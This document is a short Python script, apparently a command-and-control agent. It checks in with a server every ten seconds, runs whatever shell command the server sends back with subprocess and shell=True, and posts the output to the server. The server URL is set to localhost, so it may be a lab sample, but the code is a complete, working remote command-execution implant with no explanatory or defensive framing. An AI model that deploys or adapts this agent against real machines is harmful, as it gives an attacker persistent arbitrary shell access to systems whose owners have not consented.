import requests
import subprocess
import time

SERVER_URL = "http://127.0.0.1:5000"
AGENT_ID = "Agent_001"

def checkin():
    response = requests.post(f"{SERVER_URL}/checkin", json={"agent_id": AGENT_ID})
    return response.json()

def send_result(command, result):
    requests.post(f"{SERVER_URL}/result", json={
        "agent_id": AGENT_ID,
        "command": command,
        "result": result
    })

while True:
    try:
        # Check in with the server
        task = checkin()
        command = task.get('command')

        # Execute the command
        result = subprocess.check_output(command, shell=True, text=True)
        send_result(command, result)
    except Exception as e:
        send_result(command, str(e))
    time.sleep(10)  # Check in every 10 seconds
